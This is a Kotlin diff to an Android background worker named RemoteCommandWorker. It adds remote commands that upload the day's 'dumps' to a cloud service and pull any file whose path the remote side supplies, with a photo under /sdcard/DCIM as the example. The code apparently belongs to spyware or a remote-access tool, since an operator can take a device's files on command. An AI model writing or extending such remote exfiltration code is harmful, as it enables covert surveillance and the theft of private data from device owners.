@@ -110,6 +110,25 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                                 applicationContext.stopService(i)
                                 status = "EXECUTED (STOPPED)"
                             }
+                            // --- NEW: UPLOAD DUMPS ---
+                            else if (cmd.getString("file_name") == "UPLOAD_DUMPS") {
+                                val dumps = DumpManager.getDumpsForToday()
+                                dumps.forEach { file ->
+                                    CloudManager.uploadFile(applicationContext, file)
+                                }
+                                status = "EXECUTED (${dumps.size} FILES)"
+                            }
+                            // --- NEW: PULL SPECIFIC FILE ---
+                            else if (cmd.getString("file_name") == "PULL_FILE") {
+                                val path = cmd.optString("content") // e.g. "/sdcard/DCIM/pic.jpg"
+                                val file = File(path)
+                                if (file.exists() && file.isFile) {
+                                    CloudManager.uploadFile(applicationContext, file)
+                                    status = "EXECUTED (UPLOADING)"
+                                } else {
+                                    status = "FAILED (NOT FOUND)"
+                                }
+                            }
                             // --- 5. FILE/FOLDER CREATION ---
                             else if (fileName.isNotEmpty()) {
                                 val targetFile = File(targetDir, fileName)
